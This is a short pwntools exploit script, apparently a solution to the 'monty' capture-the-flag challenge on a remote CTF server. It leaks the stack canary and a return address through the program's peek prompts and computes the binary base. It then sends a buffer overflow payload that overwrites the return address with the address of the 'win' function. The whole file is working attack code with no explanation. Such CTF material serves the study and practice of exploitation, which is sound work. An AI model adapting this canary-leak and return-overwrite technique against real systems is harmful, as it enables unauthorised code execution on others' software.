from pwn import *

context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-v']

target = './monty'
target_elf = ELF(target)

io = remote('chall.lac.tf', 31132)

info(io.recvrepeat(1))
io.sendline(b'465')
io.recvuntil(b"Peek 1: ")
leak = io.recvuntil(b"\n")[:-1]
canary = int(leak)
info(f"canary: {canary}")

io.sendline(b'467')
io.recvuntil(b"Peek 2: ")
leak = io.recvuntil(b"\n")[:-1]
main_ret = int(leak)
info(f"main ret: {main_ret}")
target_elf.address = main_ret - 5758

io.recvrepeat(1)
io.sendline(cyclic(25) + p64(canary) + p64(0xdeadbeefdeadbeef) + p64(target_elf.symbols['win']))
info(io.recvrepeat(1))
